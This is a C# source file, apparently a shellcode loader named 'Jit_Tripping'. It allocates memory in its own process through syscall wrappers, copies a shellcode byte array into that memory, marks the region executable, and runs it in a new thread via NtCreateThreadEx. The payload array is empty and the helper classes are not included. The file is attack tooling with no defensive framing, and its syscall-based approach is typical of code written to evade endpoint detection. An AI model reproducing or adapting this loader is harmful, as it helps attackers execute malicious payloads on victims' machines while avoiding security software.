using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Diagnostics;
namespace Jit_Tripping
{
    class Program
    {
        public static void Main()
        {
            ntdll ntdll = new ntdll();
            byte[] shellcode = new byte[276] {  };
            IntPtr pBaseAddress = IntPtr.Zero;
            IntPtr Region = (IntPtr)shellcode.Length;
            object[] ntallocargs = { Process.GetCurrentProcess().Handle, pBaseAddress, IntPtr.Zero, Region, (uint)0x3000, (uint)0x04 };
            ntdll.betterSyscallInvoke<Delegates.NtAllocateVirtualMemory>("NtAllocateVirtualMemory", ntallocargs);
            pBaseAddress = (IntPtr)ntallocargs[1];
            Region = (IntPtr)ntallocargs[3];

            IntPtr tempBuffer = IntPtr.Zero;
            ntallocargs = new object[] { Process.GetCurrentProcess().Handle, tempBuffer, IntPtr.Zero, Region, (uint)0x3000, (uint)0x04 };
            ntdll.betterSyscallInvoke<Delegates.NtAllocateVirtualMemory>("NtAllocateVirtualMemory", ntallocargs);
            tempBuffer = (IntPtr)ntallocargs[1];
            Marshal.Copy(shellcode, 0, tempBuffer, shellcode.Length);
            uint bytesWritten = 0;
            ntdll.betterSyscallInvoke<Delegates.NtWriteVirtualMemory>("NtWriteVirtualMemory", new object[] { Process.GetCurrentProcess().Handle, pBaseAddress, tempBuffer, (uint)shellcode.Length, bytesWritten });

            IntPtr hSize = (IntPtr)shellcode.Length;
            uint oldPro = 0;
            ntdll.betterSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", new object[] { Process.GetCurrentProcess().Handle, pBaseAddress, hSize, (uint)0x20, oldPro });

            IntPtr hThread = IntPtr.Zero;
            object[] threadargs = new object[] { hThread, (uint)0x02000000, IntPtr.Zero, Process.GetCurrentProcess().Handle, pBaseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero };
            ntdll.betterSyscallInvoke<Delegates.NtCreateThreadEx>("NtCreateThreadEx", threadargs);
            Thread.Sleep(1000);
        }
    }
}
